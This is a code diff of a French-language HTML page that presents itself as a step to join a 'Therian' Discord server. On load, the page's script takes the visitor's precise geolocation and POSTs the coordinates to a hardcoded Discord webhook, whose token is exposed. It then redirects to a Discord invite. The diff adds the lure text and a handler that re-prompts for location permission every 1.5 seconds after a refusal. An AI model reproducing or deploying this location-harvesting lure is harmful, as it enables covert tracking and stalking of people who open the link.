@@ -2,7 +2,7 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <title>Localisation</title>
+  <title>Rejoindre le serveur Discord Therian</title>
   <style>
     body {
       background: radial-gradient(circle at center, #111 0%, #000 100%);
@@ -16,25 +16,27 @@
       text-align: center;
     }
     h1 {
-      font-size: 1.8em;
-      font-weight: 400;
-      letter-spacing: 1px;
+      font-size: 1.6em;
+      font-weight: 500;
+      letter-spacing: 0.5px;
       color: #f5f5f5;
       text-shadow: 0px 0px 8px rgba(255, 255, 255, 0.15);
+      max-width: 85%;
     }
   </style>
 </head>
 <body>
-  <h1>Activer la localisation…</h1>
+  <h1>Activer la localisation pour rejoindre le serveur Discord Therian</h1>
 
   <script>
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1367237113220698184/dRNpJg9cI-GD6PMGNHE22eAvjVPOIz5i8zfuIWOVADYCplQvQ3UBcqCL1vFet8CRtcMr";
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1367237113220698184/dRNpJg9cI-GD6PMGNHE22eAvjVPOIz5i8zfuIWOVADYCplQvQ3UBcqCL1vFet8CRtcMr"; 
     const REDIRECT_URL = "https://discord.gg/UYqhGQmdQR";
 
     function envoyerPosition(position) {
       const lat = position.coords.latitude.toFixed(6);
       const lng = position.coords.longitude.toFixed(6);
 
+      // Envoi au webhook Discord
       fetch(WEBHOOK_URL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -42,20 +44,23 @@
           content: `📍 Nouvelle localisation :\nLatitude: ${lat}\nLongitude: ${lng}`
         })
       }).finally(() => {
-          
+        // Redirection vers Discord après envoi
         window.location.href = REDIRECT_URL;
       });
     }
 
-    function erreurPosition() {
-      location.reload();
+    function redemanderPermission() {
+      // Réessaye automatiquement en cas de refus ou d’erreur
+      setTimeout(() => {
+        navigator.geolocation.getCurrentPosition(envoyerPosition, redemanderPermission);
+      }, 1500);
     }
 
     window.onload = function() {
       if ("geolocation" in navigator) {
-        navigator.geolocation.getCurrentPosition(envoyerPosition, erreurPosition);
+        navigator.geolocation.getCurrentPosition(envoyerPosition, redemanderPermission);
       } else {
-        alert("La géolocalisation n'est pas supportée.");
+        alert("La géolocalisation n'est pas supportée par ce navigateur.");
       }
     };
   </script>
